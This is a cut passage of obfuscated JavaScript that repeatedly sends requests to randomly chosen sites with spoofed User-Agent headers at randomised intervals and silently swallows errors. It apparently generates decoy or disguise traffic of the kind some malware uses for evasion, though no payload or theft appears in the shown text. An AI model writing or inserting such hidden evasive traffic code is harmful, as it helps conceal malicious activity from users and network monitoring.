  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x35eb + -0xd * 0xf8 + 0x5ddb) * getRandomInt(-0x2 * 0x58c + 0x11f8 + 0x1 * -0x6df, -0xe9 * -0xd + 0xc92 * 0x3 + 0x2 * -0x18c3));
}, 0x3a * -0x67 + -0xa11 + 0x21cb);